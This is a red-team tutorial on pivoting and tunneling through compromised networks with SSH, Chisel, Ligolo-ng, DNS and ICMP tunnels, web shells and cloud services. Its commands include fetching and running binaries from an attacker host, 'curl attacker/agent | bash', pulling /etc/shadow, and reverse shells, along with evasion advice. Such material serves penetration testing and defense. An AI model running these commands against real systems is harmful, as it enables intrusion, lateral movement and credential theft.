# Network Pivoting and Tunneling

> **MITRE ATT&CK Mapping**: T1572 (Protocol Tunneling), T1090 (Proxy), T1090.001 (Internal Proxy), T1090.002 (External Proxy), T1021 (Remote Services), T1021.004 (SSH), T1572.002 (DNS Tunneling)
> **Tactic**: Lateral Movement, Command and Control
> **Platforms**: Windows, Linux, macOS, Cloud (AWS, Azure, GCP)
> **Required Permissions**: Varies (User for most tunneling; Root/Administrator for TUN/TAP interfaces, ICMP tunnels)
> **OPSEC Risk**: Medium to High (depending on protocol and traffic volume)

---

## Strategic Overview

Network pivoting is the practice of using a compromised host as a relay point to access otherwise unreachable network segments. In modern enterprise environments with segmented networks, VLANs, and zero-trust architectures, pivoting remains one of the most critical capabilities for red team operators. A single foothold on a DMZ host or dual-homed server can unlock access to entire internal networks, database tiers, and management planes that are invisible from the external attack surface.

The choice of pivoting technique is a strategic decision that balances operational requirements against detection risk. SSH tunneling through an already-compromised Linux server generates traffic that blends with legitimate administrative activity. DNS tunneling through corporate resolvers may bypass egress filtering but introduces latency and throughput limitations. HTTP-based tunneling through web shells leverages existing allowed traffic paths but requires a web application foothold. Each technique has distinct signatures, bandwidth characteristics, and stability profiles that must be matched to the operational context.

Modern red team operations frequently require multi-hop pivot chains -- traversing two or three network boundaries to reach a target. This demands careful planning of tunnel stability, latency tolerance, and failover mechanisms. The 2025 landscape has seen significant maturation of tools like Ligolo-ng which simplify complex multi-hop scenarios, while defenders have simultaneously improved their ability to detect anomalous tunnel traffic through behavioral analytics and encrypted traffic analysis. Understanding both the offensive capability and defensive visibility of each technique is essential for effective operational planning.

---

## Technical Deep-Dive

### 1. SSH Tunneling

SSH remains the most versatile and widely available pivoting protocol. Present on virtually every Linux/Unix system and increasingly on Windows (OpenSSH ships with Windows 10+), SSH provides encrypted tunneling with multiple forwarding modes.

#### Local Port Forwarding

Local port forwarding binds a port on the attacker's machine and forwards traffic through the SSH connection to a destination reachable from the pivot host.

```bash
# Forward local port 8445 through pivot to target's SMB service
ssh -L 8445:10.10.20.5:445 user@pivot-host

# Now access SMB on target via localhost:8445
smbclient -p 8445 //127.0.0.1/C$ -U administrator

# Multiple forwards in a single connection
ssh -L 8445:10.10.20.5:445 -L 8080:10.10.20.10:80 -L 3389:10.10.20.15:3389 user@pivot-host

# Bind to all interfaces (allow other team members to use the tunnel)
ssh -L 0.0.0.0:8445:10.10.20.5:445 user@pivot-host
```

#### Remote Port Forwarding

Remote port forwarding binds a port on the pivot host and forwards traffic back to the attacker's machine. This is essential when the pivot host cannot initiate outbound connections to the attacker but the attacker can reach the pivot.

```bash
# On pivot host: forward remote port 9999 back to attacker's listener on port 4444
ssh -R 9999:127.0.0.1:4444 attacker@attacker-ip

# Reverse tunnel: expose attacker's local web server on pivot host
ssh -R 0.0.0.0:8080:127.0.0.1:80 attacker@attacker-ip

# Note: GatewayPorts must be enabled in sshd_config for 0.0.0.0 binding
# On the SSH server: GatewayPorts yes (or clientspecified)
```

#### Dynamic SOCKS Proxy

Dynamic port forwarding creates a SOCKS4/SOCKS5 proxy that routes any TCP traffic through the SSH tunnel, providing flexible access to the entire subnet reachable from the pivot.

```bash
# Create SOCKS proxy on local port 1080
ssh -D 1080 user@pivot-host

# Bind to all interfaces for team use
ssh -D 0.0.0.0:1080 user@pivot-host

# Use with proxychains
proxychains4 nmap -sT -Pn -p 445,3389,22 10.10.20.0/24

# Use with curl
curl --socks5 127.0.0.1:1080 http://10.10.20.5/

# Use with Firefox (configure SOCKS5 proxy in network settings)
# or command line:
firefox --proxy-server="socks5://127.0.0.1:1080"
```

#### ProxyJump (Multi-Hop SSH)

ProxyJump provides native SSH support for chaining through multiple hosts, replacing the older ProxyCommand approach.

```bash
# Jump through one pivot host to reach the target
ssh -J user@pivot1 user@target

# Chain through multiple pivots
ssh -J user@pivot1,user@pivot2 user@target

# With port specifications
ssh -J user@pivot1:2222,user@pivot2:22 user@target

# Equivalent ~/.ssh/config entry
# Host target
#     HostName 10.10.30.5
#     User admin
#     ProxyJump pivot2
#
# Host pivot2
#     HostName 10.10.20.5
#     User user
#     ProxyJump pivot1
#
# Host pivot1
#     HostName 192.168.1.100
#     User user
```

#### ControlMaster Multiplexing

ControlMaster allows multiple SSH sessions to share a single TCP connection, reducing connection setup overhead and providing persistent tunnel infrastructure.

```bash
# ~/.ssh/config for persistent multiplexed connections
# Host pivot-host
#     HostName 192.168.1.100
#     User operator
#     ControlMaster auto
#     ControlPath /tmp/ssh-%r@%h:%p
#     ControlPersist 600
#     ServerAliveInterval 60
#     ServerAliveCountMax 3
#     DynamicForward 1080
#     LocalForward 8445 10.10.20.5:445
#     LocalForward 3389 10.10.20.15:3389

# First connection establishes the master
ssh pivot-host

# Subsequent connections reuse the master (instant connection, no auth)
ssh pivot-host -O check    # Check if master is running
ssh pivot-host -O exit     # Terminate master and all connections

# Add a forward to an existing master connection
ssh pivot-host -O forward -L 9090:10.10.20.20:8080
```

#### SSH Over HTTP (Firewall Bypass)

When SSH traffic is blocked at the firewall but HTTP/HTTPS is permitted, tools like corkscrew and proxytunnel can tunnel SSH through HTTP proxies.

```bash
# Using corkscrew to tunnel SSH through an HTTP proxy
# ~/.ssh/config:
# Host pivot-host
#     ProxyCommand corkscrew http-proxy.corp.local 8080 %h %p

# Using proxytunnel
# Host pivot-host
#     ProxyCommand proxytunnel -p http-proxy.corp.local:8080 -d %h:%p -H "User-Agent: Mozilla/5.0"

# Direct corkscrew usage
ssh -o ProxyCommand="corkscrew proxy.corp.local 3128 %h %p" user@pivot-host
```

#### sshuttle (VPN-like Transparent Proxy)

sshuttle creates a transparent proxy that routes all traffic for specified subnets through the SSH connection without requiring root on the remote side.

```bash
# Route entire subnet through pivot (requires local root/sudo)
sshuttle -r user@pivot-host 10.10.20.0/24

# Route multiple subnets
sshuttle -r user@pivot-host 10.10.20.0/24 10.10.30.0/24 172.16.0.0/16

# Exclude specific hosts from routing
sshuttle -r user@pivot-host 10.10.20.0/24 -x 10.10.20.1

# Include DNS forwarding
sshuttle --dns -r user@pivot-host 10.10.20.0/24

# Use with a specific SSH key
sshuttle -r user@pivot-host --ssh-cmd "ssh -i /path/to/key" 10.10.20.0/24

# Daemon mode (background)
sshuttle -D -r user@pivot-host 10.10.20.0/24
```

---

### 2. Chisel

Chisel is a fast TCP/UDP tunnel transported over HTTP and secured via SSH. It is a single binary with no dependencies, making it ideal for deployment on compromised hosts.

#### Basic Server/Client Setup

```bash
# On attacker machine: start Chisel server with reverse tunnel support
chisel server --reverse --port 8080

# On attacker machine: with authentication
chisel server --reverse --port 8080 --auth user:password

# On attacker machine: with TLS
chisel server --reverse --port 443 --tls-key server.key --tls-cert server.crt
```

#### SOCKS Proxy (Reverse)

```bash
# On pivot host: create reverse SOCKS proxy
chisel client attacker-ip:8080 R:socks

# This creates a SOCKS5 proxy on the attacker's port 1080
# Use with proxychains:
proxychains4 nmap -sT -Pn 10.10.20.0/24

# Specify a custom SOCKS port on the attacker side
chisel client attacker-ip:8080 R:9050:socks
```

#### Port Forwarding (Reverse)

```bash
# Forward attacker:8888 to target:445 through pivot
chisel client attacker-ip:8080 R:8888:10.10.20.5:445

# Multiple port forwards in a single client
chisel client attacker-ip:8080 R:8888:10.10.20.5:445 R:8889:10.10.20.5:3389 R:9090:10.10.20.10:80

# Local port forward (pivot binds and forwards to attacker)
chisel client attacker-ip:8080 8888:10.10.20.5:445
```

#### Double Pivot with Chisel

```bash
# === Scenario: Attacker -> Pivot1 (DMZ) -> Pivot2 (Internal) -> Target ===

# Step 1: Start Chisel server on attacker
chisel server --reverse --port 8080

# Step 2: On Pivot1 - connect back to attacker, create reverse SOCKS
chisel client attacker-ip:8080 R:1080:socks

# Step 3: Upload second Chisel server binary to Pivot1
# Start Chisel server on Pivot1
chisel server --reverse --port 9090

# Step 4: On Pivot2 - connect to Pivot1's Chisel server
# (Use proxychains if needed to reach Pivot1 from Pivot2)
chisel client pivot1-ip:9090 R:socks

# Step 5: On Pivot1 - the second SOCKS proxy is now on Pivot1:1080 (from step 4)
# Chain proxies in /etc/proxychains4.conf:
# [ProxyList]
# socks5 127.0.0.1 1080   # First hop (Pivot1)
# socks5 pivot1-ip 1080    # Second hop (Pivot2 via Pivot1)

# Alternative: Use Chisel's port forwarding to chain
chisel client attacker-ip:8080 R:9090:pivot2-ip:9090
# Then on Pivot2: chisel client pivot1-ip:9090 R:socks
```

#### Windows Deployment

```powershell
# Download and execute Chisel on Windows target
certutil -urlcache -split -f http://attacker-ip/chisel.exe C:\Windows\Temp\chisel.exe
C:\Windows\Temp\chisel.exe client attacker-ip:8080 R:socks

# Or via PowerShell
Invoke-WebRequest -Uri http://attacker-ip/chisel.exe -OutFile C:\Windows\Temp\c.exe
Start-Process -NoNewWindow C:\Windows\Temp\c.exe -ArgumentList "client","attacker-ip:8080","R:socks"
```

---

### 3. Ligolo-ng

Ligolo-ng is an advanced tunneling tool that creates a TUN interface on the attacker's machine, providing seamless, transparent access to remote networks. It eliminates the need for SOCKS proxies and proxychains, allowing tools to work natively as if directly connected to the target network.

#### Initial Setup (Attacker Machine)

```bash
# Create TUN interface (Linux)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start Ligolo-ng proxy (listener)
./proxy -selfcert -laddr 0.0.0.0:11601

# With a custom certificate
./proxy -certfile cert.pem -keyfile key.pem -laddr 0.0.0.0:11601
```

#### Agent Deployment on Pivot Host

```bash
# Linux pivot - connect agent back to proxy
./agent -connect attacker-ip:11601 -ignore-cert

# Windows pivot
agent.exe -connect attacker-ip:11601 -ignore-cert

# Agent with retry and auto-reconnect
./agent -connect attacker-ip:11601 -ignore-cert -retry
```

#### Session Management and Routing

```bash
# In Ligolo-ng proxy console:

# List available sessions
ligolo-ng>> session

# Select a session (e.g., session 1)
ligolo-ng>> session
? Specify a session: 1 - user@pivot-host - 192.168.1.100

# View network interfaces on the pivot
[Agent: user@pivot-host] >> ifconfig

# Start the tunnel
[Agent: user@pivot-host] >> start

# On attacker machine (separate terminal): add route to target subnet
sudo ip route add 10.10.20.0/24 dev ligolo

# Now tools work directly against the remote subnet -- no proxychains needed
nmap -sT -Pn -p 445,3389,22 10.10.20.0/24
crackmapexec smb 10.10.20.0/24
evil-winrm -i 10.10.20.5 -u administrator -p 'Password123'
```

#### Double Pivoting with Ligolo-ng

```bash
# === Scenario: Attacker -> Pivot1 (10.10.10.0/24 & 10.10.20.0/24) -> Pivot2 (10.10.20.0/24 & 10.10.30.0/24) ===

# Step 1: Set up first TUN interface and route (already done above)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.20.0/24 dev ligolo

# Step 2: Agent on Pivot1 connects back to proxy
# On Pivot1: ./agent -connect attacker-ip:11601 -ignore-cert
# In proxy console: select session for Pivot1, start tunnel

# Step 3: Create a second TUN interface for the second hop
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 10.10.30.0/24 dev ligolo2

# Step 4: Set up a listener on Pivot1 to relay agent connections
# In Ligolo-ng proxy console (with Pivot1 session selected):
[Agent: user@pivot1] >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Step 5: On Pivot2 - connect agent to Pivot1's listener
# On Pivot2: ./agent -connect pivot1-ip:11601 -ignore-cert
# The connection is relayed through Pivot1 back to the attacker's proxy

# Step 6: In proxy console - select Pivot2 session and start tunnel on ligolo2
[Agent: user@pivot2] >> start --tun ligolo2

# Now the attacker can directly access 10.10.30.0/24
nmap -sT -Pn 10.10.30.0/24
```

#### Listener Feature for Reverse Connections

```bash
# Ligolo-ng listeners allow you to catch reverse shells through the tunnel

# Add a listener on the pivot agent that forwards to attacker
[Agent: user@pivot-host] >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Now set up a netcat listener on the attacker
nc -lvnp 4444

# Any reverse shell from the internal network connecting to pivot-host:4444
# will be forwarded to the attacker's nc listener

# List active listeners
[Agent: user@pivot-host] >> listener_list

# Remove a listener
[Agent: user@pivot-host] >> listener_remove --id 0
```

---

### 4. SOCKS Proxy Chains

#### ProxyChains Configuration

```bash
# /etc/proxychains4.conf (or /etc/proxychains.conf)

# Choose chain type:
# dynamic_chain  - skips dead proxies, most resilient
# strict_chain   - all proxies must be online, in order
# round_robin_chain - distributes across proxies
# random_chain   - randomizes proxy selection

dynamic_chain

# Quiet mode (suppress proxy connection output)
quiet_mode

# Proxy DNS requests through the chain (critical for OPSEC)
proxy_dns

# Timeout settings
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Single SOCKS proxy (SSH dynamic forward)
socks5 127.0.0.1 1080

# Chained proxies (for double pivoting)
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```

#### SOCKS4 vs SOCKS5

```
SOCKS4:
  - TCP only (no UDP)
  - No authentication support
  - IPv4 only
  - No DNS resolution on the proxy side (client must resolve)

SOCKS5:
  - TCP and UDP support
  - Username/password authentication
  - IPv4 and IPv6 support
  - DNS resolution on the proxy side (critical for internal hostnames)
  - Preferred for red team operations due to DNS and auth support
```

#### Nmap Through SOCKS (Limitations)

```bash
# SOCKS proxies only support TCP -- no raw packets, no ICMP
# Only TCP connect scan (-sT) works through proxychains
# SYN scan (-sS), UDP scan (-sU), ICMP ping will NOT work

# Correct usage:
proxychains4 nmap -sT -Pn -p 22,80,443,445,3389 10.10.20.0/24

# Common mistakes to avoid:
# proxychains4 nmap -sS 10.10.20.5        # FAILS - requires raw sockets
# proxychains4 nmap -sU 10.10.20.5        # FAILS - UDP not supported in SOCKS4
# proxychains4 nmap 10.10.20.5            # May fail - default SYN scan needs raw sockets

# For faster scanning through SOCKS, consider:
proxychains4 nmap -sT -Pn --open -T4 -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,5985,8080,8443 10.10.20.0/24

# Alternative: use Ligolo-ng (no SOCKS needed, raw sockets work)
```

#### Metasploit SOCKS Proxy and Routing

```bash
# In Metasploit, after gaining a Meterpreter session:

# Add route through session to internal subnet
meterpreter> run autoroute -s 10.10.20.0/24
# Or from msf console:
msf6> route add 10.10.20.0/24 <session_id>

# Start SOCKS proxy module
msf6> use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy)> set SRVPORT 1080
msf6 auxiliary(server/socks_proxy)> set VERSION 5
msf6 auxiliary(server/socks_proxy)> run -j

# Now use proxychains with Metasploit's SOCKS proxy
# /etc/proxychains4.conf:
# [ProxyList]
# socks5 127.0.0.1 1080

proxychains4 nmap -sT -Pn -p 445 10.10.20.0/24

# Or use Metasploit modules directly (routing is transparent)
msf6> use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec)> set RHOSTS 10.10.20.5
msf6 exploit(windows/smb/psexec)> run
# Traffic automatically routes through the Meterpreter session
```

---

### 5. DNS Tunneling

DNS tunneling encapsulates data within DNS queries and responses, exploiting the fact that DNS traffic is almost universally permitted through firewalls. Data is encoded in subdomain labels (for queries) and TXT/CNAME/MX records (for responses).

#### Iodine

```bash
# === Server Setup (Attacker's Authoritative DNS Server) ===
# Requires: domain with NS record pointing to attacker's server
# e.g., NS record: t1.example.com -> attacker-ip

# Start iodine server
sudo iodined -f -c -P secretpassword 10.0.0.1 t1.example.com

# -f  = foreground
# -c  = disable client IP checking
# -P  = password
# 10.0.0.1 = tunnel IP for server side
# t1.example.com = tunnel domain

# === Client Setup (Compromised Host) ===
sudo iodine -f -P secretpassword t1.example.com

# After connection, a tunnel interface (dns0) is created:
# Server: 10.0.0.1
# Client: 10.0.0.2

# Route traffic through the tunnel
ssh -D 1080 attacker@10.0.0.1    # Create SOCKS proxy through DNS tunnel

# Performance tuning
sudo iodined -f -c -P pass 10.0.0.1 t1.example.com -m 1200   # Set MTU
sudo iodine -f -P pass -T TXT t1.example.com                    # Force TXT records (more data)
sudo iodine -f -P pass -T NULL t1.example.com                   # NULL records (most efficient)
```

#### dnscat2

```bash
# === Server (Attacker) ===
# Install: gem install dnscat2
ruby dnscat2.rb example.com --secret=sharedsecret

# With direct connection (no domain needed, but less stealthy)
ruby dnscat2.rb --dns server=0.0.0.0,port=53 --secret=sharedsecret

# === Client (Compromised Host) ===
# Compiled client binary
./dnscat --secret=sharedsecret example.com

# Direct connection mode
./dnscat --dns server=attacker-ip,port=53 --secret=sharedsecret

# === dnscat2 Session Commands ===
dnscat2> windows           # List sessions
dnscat2> window -i 1       # Interact with session
command (client)> shell     # Spawn a shell
command (client)> download /etc/shadow /tmp/shadow   # File transfer
command (client)> upload /tmp/payload /tmp/payload   # Upload file
command (client)> listen 127.0.0.1:4444 10.10.20.5:445   # Port forward (local:4444 -> target:445)
```

#### dns2tcp

```bash
# === Server (Attacker) ===
# /etc/dns2tcpd.conf:
# listen = 0.0.0.0
# port = 53
# user = nobody
# chroot = /tmp
# domain = t1.example.com
# resources = ssh:127.0.0.1:22, smtp:127.0.0.1:25

dns2tcpd -f /etc/dns2tcpd.conf

# === Client (Compromised Host) ===
dns2tcpc -z t1.example.com -r ssh -l 2222 attacker-ip

# Now SSH through the DNS tunnel
ssh -p 2222 attacker@127.0.0.1 -D 1080
```

---

### 6. ICMP Tunneling

ICMP tunneling encapsulates data within ICMP echo request/reply packets. Useful when TCP and UDP egress is blocked but ICMP (ping) is permitted.

#### hans (IP over ICMP)

```bash
# === Server (Attacker) ===
sudo ./hans -s 10.0.0.1 -p password
# Creates tun0 with IP 10.0.0.1

# === Client (Compromised Host) ===
sudo ./hans -c attacker-ip -p password
# Creates tun0 with IP 10.0.0.100

# Route traffic through ICMP tunnel
ssh -D 1080 attacker@10.0.0.1
sshuttle -r attacker@10.0.0.1 10.10.20.0/24
```

#### ptunnel-ng

```bash
# === Server (Attacker) ===
sudo ptunnel-ng -r -R22
# -r  = run as server
# -R22 = forward to local SSH port 22

# === Client (Compromised Host) ===
sudo ptunnel-ng -p attacker-ip -l 2222 -r 127.0.0.1 -R 22
# -p  = proxy/server address
# -l  = local port to listen on
# -r  = remote destination
# -R  = remote port

# Connect through the ICMP tunnel
ssh -p 2222 attacker@127.0.0.1 -D 1080

# With authentication
sudo ptunnel-ng -r -R22 -x secretpassword          # server
sudo ptunnel-ng -p attacker-ip -l 2222 -r 127.0.0.1 -R 22 -x secretpassword  # client
```

#### icmpsh

```bash
# === Attacker (Linux - listener) ===
# Disable kernel ICMP replies first
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Start the listener
python3 icmpsh_m.py attacker-ip pivot-ip

# === Target (Windows - no admin required) ===
icmpsh.exe -t attacker-ip -d 500 -b 30 -s 128

# -t = target (attacker IP)
# -d = delay between requests (ms)
# -b = blanket requests (number)
# -s = max data size in packet
```

---

### 7. HTTP/S Tunneling (Web Shell-Based)

HTTP tunneling through web shells leverages existing web application access to create tunnels that blend with legitimate web traffic.

#### Neo-reGeorg

```bash
# === Generate web shell tunnel agent ===
python3 neoreg.py generate -k secretkey

# Generates tunnel files for multiple platforms:
# tunnel.aspx, tunnel.ashx, tunnel.jsp, tunnel.jspx,
# tunnel.php, tunnel.go, tunnel.nosocket.php

# Upload the appropriate agent to the target web server

# === Start the SOCKS proxy ===
python3 neoreg.py -k secretkey -u http://target.com/uploads/tunnel.php

# Default SOCKS port is 1080
# Custom port:
python3 neoreg.py -k secretkey -u http://target.com/uploads/tunnel.php -p 9050

# With custom headers (bypass WAF/proxy):
python3 neoreg.py -k secretkey -u http://target.com/uploads/tunnel.php \
    -H "Cookie: session=abc123" -H "X-Forwarded-For: 10.0.0.1"

# Through an HTTP proxy:
python3 neoreg.py -k secretkey -u http://target.com/uploads/tunnel.php \
    --proxy http://proxy.corp.local:8080
```

#### pystinger

```bash
# === Proxy (Attacker) ===
# Start pystinger proxy
python3 pystinger.py --server http://target.com/proxy.php --listen 0.0.0.0:60000

# === Agent (Deploy on web server) ===
# Upload proxy.php to target web server

# === Usage ===
# pystinger creates a SOCKS proxy on the attacker's machine
# Traffic is encapsulated in HTTP requests to the web shell
```

#### ABPTTS (A Black Path Toward The Sun)

```bash
# === Generate agent ===
python abpttsfactory.py -o webshell

# Generates JSP/ASPX/PHP agents

# === Deploy agent on target web server ===
# Upload webshell.jsp to target

# === Create tunnel ===
python abpttsclient.py -c webshell/config.txt \
    -u http://target.com/webshell.jsp \
    -f 127.0.0.1:4444/10.10.20.5:445

# Maps local port 4444 to target internal host 10.10.20.5:445
```

#### Tunna

```bash
# === Deploy web shell proxy on target ===
# Upload conn.php/conn.aspx/conn.jsp to target web server

# === Create tunnel ===
python proxy.py -u http://target.com/conn.php -l 8888 -r 3389 -a 10.10.20.5

# -u = URL of webshell
# -l = local port
# -r = remote port
# -a = remote address (internal target)

# SOCKS proxy mode
python proxy.py -u http://target.com/conn.php -l 1080 -s
```

---

### 8. Named Pipe Relaying (Windows SMB)

Windows named pipes over SMB (port 445) provide a method for C2 traffic relay within Windows environments. This is particularly valuable in environments where SMB traffic between hosts is expected.

```powershell
# === Cobalt Strike SMB Beacon ===
# Create an SMB listener in Cobalt Strike
# Beacon> spawn_listener smb \\.\pipe\msagent_0e

# Link beacon to an SMB beacon on another host
beacon> link 10.10.20.5 msagent_0e

# Unlink to disconnect
beacon> unlink 10.10.20.5

# === Custom Named Pipe Relay ===
# Create a named pipe server (PowerShell)
$pipeName = "msagent_0e"
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut)
$pipe.WaitForConnection()

# Read from pipe
$reader = New-Object System.IO.StreamReader($pipe)
$data = $reader.ReadLine()

# === Named Pipe Client ===
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream("10.10.20.5", "msagent_0e", [System.IO.Pipes.PipeDirection]::InOut)
$pipe.Connect()

# Write to pipe
$writer = New-Object System.IO.StreamWriter($pipe)
$writer.WriteLine("data")
$writer.Flush()
```

#### Detection Considerations for Named Pipes

```
- Sysmon Event ID 17 (Pipe Created) and 18 (Pipe Connected)
- Monitor for pipes with randomized or suspicious names
- Common Cobalt Strike default pipes: msagent_*, MSSE-*, postex_*, status_*
- Legitimate pipes to blend with: spoolss, winreg, samr, lsarpc, srvsvc
```

---

### 9. Cloud Pivoting

#### AWS SSM Session Manager as Pivot

```bash
# Start SSM session to EC2 instance (requires IAM permissions)
aws ssm start-session --target i-0123456789abcdef0

# Port forwarding through SSM
aws ssm start-session --target i-0123456789abcdef0 \
    --document-name AWS-StartPortForwardingSession \
    --parameters '{"portNumber":["3389"],"localPortNumber":["13389"]}'

# Port forwarding to remote host through EC2
aws ssm start-session --target i-0123456789abcdef0 \
    --document-name AWS-StartPortForwardingSessionToRemoteHost \
    --parameters '{"host":["10.0.2.50"],"portNumber":["445"],"localPortNumber":["8445"]}'

# SSH through SSM (no inbound security group rules needed)
ssh -o ProxyCommand="aws ssm start-session --target %h --document-name AWS-StartSSHSession" ec2-user@i-0123456789abcdef0
```

#### VPC Peering and Transit Gateway Abuse

```bash
# Enumerate VPC peering connections
aws ec2 describe-vpc-peering-connections

# Check route tables for peering routes
aws ec2 describe-route-tables --filters "Name=route.vpc-peering-connection-id,Values=pcx-*"

# Enumerate Transit Gateway attachments
aws ec2 describe-transit-gateway-attachments

# If an EC2 instance is in a VPC peered with another VPC, direct access to the peered
# VPC's resources may be possible without additional tunneling

# Abuse EC2 Instance Connect for temporary SSH access
aws ec2-instance-connect send-ssh-public-key \
    --instance-id i-0123456789abcdef0 \
    --instance-os-user ec2-user \
    --ssh-public-key file://key.pub
```

#### Azure Pivoting

```bash
# Azure Bastion tunneling (if Bastion is deployed)
az network bastion tunnel --name MyBastion --resource-group rg1 \
    --target-resource-id /subscriptions/.../virtualMachines/vm1 \
    --resource-port 22 --port 2222

# Azure Arc for hybrid pivoting
# If Azure Arc agent is installed on on-premises servers,
# use Azure RunCommand to execute on hybrid machines
az connectedmachine run-command create --resource-group rg1 \
    --machine-name onprem-server --run-command-name pivot \
    --script "bash -c 'curl attacker/agent | bash'"
```

---

### 10. IPv6 Pivoting

Many organizations have IPv6 enabled but do not monitor or filter it, creating blind spots for pivoting.

```bash
# === Discover IPv6 addresses on the local segment ===
# Multicast ping to find link-local addresses
ping6 -c 3 ff02::1%eth0

# Scan for IPv6 hosts
nmap -6 --script=targets-ipv6-multicast-echo fe80::%eth0

# === 6to4 Tunneling ===
# Encapsulate IPv6 in IPv4 (protocol 41)
sudo ip tunnel add tun6to4 mode sit remote attacker-ipv4 local pivot-ipv4
sudo ip link set tun6to4 up
sudo ip -6 addr add 2002:c0a8:0164::1/64 dev tun6to4
sudo ip -6 route add 2002::/16 dev tun6to4

# === Teredo Tunneling ===
# Teredo encapsulates IPv6 in UDP (port 3544)
# miredo client on Linux:
sudo miredo

# === IPv6 DNS Tunnel ===
# Use iodine with IPv6 endpoints
sudo iodined -f -c -P password fd00::1 t1.example.com

# === Exploitation over IPv6 ===
# Many IDS/IPS solutions have weaker IPv6 signature sets
# SMB over IPv6
smbclient //[fe80::1%25eth0]/C$ -U administrator
# WinRM over IPv6
evil-winrm -i fe80::1%eth0 -u administrator -p 'Password123'
```

---

### 11. Double/Triple Pivot Walkthrough

This section provides a complete practical walkthrough for chaining multiple network hops.

#### Scenario

```
Attacker (192.168.1.50)
    |
    v
Pivot1 - DMZ Web Server (192.168.1.100 / 10.10.10.5)
    |
    v
Pivot2 - Internal App Server (10.10.10.20 / 10.10.20.5)
    |
    v
Target - Database Server (10.10.20.100)
```

#### Method A: SSH Chain

```bash
# Step 1: SSH to Pivot1 with dynamic SOCKS
ssh -D 1080 -J user@192.168.1.100 user@192.168.1.100

# Step 2: Through SOCKS, SSH to Pivot2 with another dynamic SOCKS
proxychains4 ssh -D 1081 user@10.10.10.20

# Step 3: Chain proxies in proxychains4.conf
# [ProxyList]
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081

# Or use ProxyJump natively:
# Add to ~/.ssh/config for persistent multi-hop:
# Host pivot1
#     HostName 192.168.1.100
#     User user
#     DynamicForward 1080
#
# Host pivot2
#     HostName 10.10.10.20
#     User user
#     ProxyJump pivot1
#     DynamicForward 1081
#
# Host target-db
#     HostName 10.10.20.100
#     User admin
#     ProxyJump pivot2

ssh target-db   # Transparently chains through pivot1 and pivot2
```

#### Method B: Ligolo-ng Chain

```bash
# Step 1: Setup on attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

./proxy -selfcert -laddr 0.0.0.0:11601

# Step 2: Deploy agent on Pivot1, connect back
# On Pivot1: ./agent -connect 192.168.1.50:11601 -ignore-cert

# Step 3: In proxy console, select Pivot1 session, start tunnel, add route
sudo ip route add 10.10.10.0/24 dev ligolo
[Agent: pivot1] >> start

# Step 4: Set up listener on Pivot1 for second agent
[Agent: pivot1] >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Step 5: Deploy agent on Pivot2, connect to Pivot1's listener
# On Pivot2: ./agent -connect 10.10.10.5:11601 -ignore-cert

# Step 6: Select Pivot2 session, start on second TUN, add route
sudo ip route add 10.10.20.0/24 dev ligolo2
[Agent: pivot2] >> start --tun ligolo2

# Step 7: Direct access to target -- no proxychains
nmap -sT -Pn -p 1433,3306 10.10.20.100
mssqlclient.py admin:password@10.10.20.100
```

#### Method C: Chisel + SSH Hybrid

```bash
# Step 1: Chisel reverse SOCKS through Pivot1
# Attacker: chisel server --reverse --port 8080
# Pivot1: chisel client 192.168.1.50:8080 R:1080:socks

# Step 2: SSH through Chisel SOCKS to Pivot2
proxychains4 ssh -D 1081 user@10.10.10.20

# Step 3: Now have two SOCKS proxies:
# 1080 -> reaches 10.10.10.0/24 (through Pivot1)
# 1081 -> reaches 10.10.20.0/24 (through Pivot1 then Pivot2)

# Access target database
proxychains4 mysql -h 10.10.20.100 -u root -p
```

---

### 12. Operational Pivot Planning

#### Tool Selection Matrix

```
| Scenario                          | Recommended Tool      | Rationale                              |
|-----------------------------------|-----------------------|----------------------------------------|
| SSH available on pivot            | SSH dynamic forward   | Native, encrypted, blends in           |
| No SSH, HTTP only outbound        | Chisel / Ligolo-ng    | Single binary, HTTP transport          |
| Web shell only access             | Neo-reGeorg / ABPTTS  | Leverages existing web foothold        |
| Only DNS permitted                | iodine / dnscat2      | DNS almost always permitted            |
| Only ICMP permitted               | hans / ptunnel-ng     | Bypasses TCP/UDP egress filtering      |
| Windows AD environment            | Named pipes / SMB     | Blends with legitimate SMB traffic     |
| Cloud environment (AWS)           | SSM / VPC peering     | Uses native cloud management channels  |
| Need raw socket support           | Ligolo-ng             | TUN interface = full network access    |
| Multiple hops required            | Ligolo-ng             | Best multi-hop support with listeners  |
| Stealth priority                  | DNS/ICMP tunneling    | Uncommon monitoring, low visibility    |
```

#### Traffic Volume Considerations

```
- SSH: Low-medium bandwidth; ~100 Mbps through tunnel; encrypted; normal admin traffic
- Chisel: Medium bandwidth; HTTP transport; WebSocket-based; noticeable under DPI
- Ligolo-ng: High bandwidth; TLS encrypted; dedicated binary; most versatile
- DNS tunneling: Very low bandwidth (1-50 KB/s); high latency; best for C2, not file transfer
- ICMP tunneling: Low bandwidth (10-100 KB/s); moderate latency; easily rate-limited
- HTTP tunneling: Medium bandwidth; limited by web server request handling
- Named pipes: Medium bandwidth; limited to Windows SMB environments
```

#### NAT Traversal Strategies

```bash
# Reverse connections always work through NAT (pivot connects to attacker)
# Use reverse tunnels when the pivot is behind NAT:

# SSH reverse tunnel
ssh -R 9090:127.0.0.1:22 attacker@attacker-ip
# Attacker: ssh -p 9090 user@127.0.0.1

# Chisel reverse mode (default behavior)
chisel client attacker-ip:8080 R:socks

